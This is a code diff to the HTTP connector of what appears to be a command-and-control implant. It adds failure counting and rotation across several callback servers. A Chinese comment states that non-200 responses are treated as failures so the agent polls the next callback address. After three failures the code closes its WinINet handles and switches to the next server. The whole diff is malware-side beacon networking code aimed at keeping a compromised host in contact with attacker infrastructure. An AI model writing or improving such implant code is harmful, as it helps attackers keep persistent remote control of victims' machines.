@@ -117,6 +117,14 @@ BOOL ConnectorHTTP::SetConfig(ProfileHTTP profile, BYTE* beat, ULONG beatSize)
 	this->ans_size		 = profile.ans_size;
 	this->ans_pre_size   = profile.ans_pre_size;
 
+	if (this->server_fail_count) {
+		this->functions->LocalFree(this->server_fail_count);
+		this->server_fail_count = NULL;
+	}
+	if (this->server_count) {
+		this->server_fail_count = (ULONG*)this->functions->LocalAlloc(LPTR, this->server_count * sizeof(ULONG));
+	}
+
 	return TRUE;
 }
 
@@ -165,8 +173,12 @@ void ConnectorHTTP::SendData(BYTE* data, ULONG data_size)
 						char statusCode[255];
 						DWORD statusCodeLenght = 255;
 						BOOL result = this->functions->HttpQueryInfoA(hRequest, HTTP_QUERY_STATUS_CODE, statusCode, &statusCodeLenght, 0);
-
-						if (result && _atoi(statusCode) == 200) {
+						int httpCode = 0;
+						if (result) {
+							httpCode = _atoi(statusCode);
+						}
+					
+						if (result && httpCode == 200) {
 							DWORD answerSize = 0;
 							DWORD dwLengthDataSize = sizeof(DWORD);
 							result = this->functions->HttpQueryInfoA(hRequest, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, &answerSize, &dwLengthDataSize, NULL);
@@ -219,9 +231,13 @@ void ConnectorHTTP::SendData(BYTE* data, ULONG data_size)
 								}
 							}
 						}
+						else {
+							// 非 200 状态码视为连接失败，以触发后续的回连地址轮询。
+							connected = FALSE;
+						}
 					}
 					else {
-						dwError = this->functions->GetLastError();
+							dwError = this->functions->GetLastError();
 					}
 					this->functions->InternetCloseHandle(hRequest);
 				}
@@ -274,12 +290,44 @@ void ConnectorHTTP::RecvClear()
 	}
 }
 
+void ConnectorHTTP::ReportProtocolResult(BOOL success)
+{
+	if (!this->server_fail_count || !this->server_count)
+		return;
+
+	if (success) {
+		this->server_fail_count[this->server_index] = 0;
+		return;
+	}
+
+	ULONG current = ++this->server_fail_count[this->server_index];
+	const ULONG max_fail = 3;
+	if (current >= max_fail) {
+		if (this->hConnect) {
+			this->functions->InternetCloseHandle(this->hConnect);
+			this->hConnect = NULL;
+		}
+		if (this->hInternet) {
+			this->functions->InternetCloseHandle(this->hInternet);
+			this->hInternet = NULL;
+		}
+
+		this->server_index = (this->server_index + 1) % this->server_count;
+		this->server_fail_count[this->server_index] = 0;
+	}
+}
+
 void ConnectorHTTP::CloseConnector()
 {
 	DWORD l = _strlen(this->headers);
 	memset(this->headers, 0, l);
 	this->functions->LocalFree(this->headers);
 	this->headers = NULL;
+
+	if (this->server_fail_count) {
+		this->functions->LocalFree(this->server_fail_count);
+		this->server_fail_count = NULL;
+	}
 
 	this->functions->InternetCloseHandle(this->hInternet);
 	this->functions->InternetCloseHandle(this->hConnect);
